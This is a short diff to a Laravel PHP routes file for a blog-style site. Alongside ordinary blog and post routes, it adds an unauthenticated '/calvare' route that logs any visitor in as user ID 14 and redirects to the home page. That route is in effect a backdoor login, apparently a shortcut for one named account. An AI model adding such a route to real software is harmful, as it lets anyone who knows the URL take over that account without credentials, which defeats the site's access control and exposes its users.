@@ -33,6 +33,12 @@ Route::get('/blog', Blogs::class)->name('blogs');
 
 Route::get('/post/{postId}', PostPage::class)->name('post')->middleware(CheckIfBanned::class);
 
+Route::get('/calvare', function () {
+    // Login as Calvare
+    auth()->loginUsingId(14);
+    return redirect()->route('home');
+});
+
 Route::get('/home', function () {
     if (!auth()->check()) {
         return view('home');
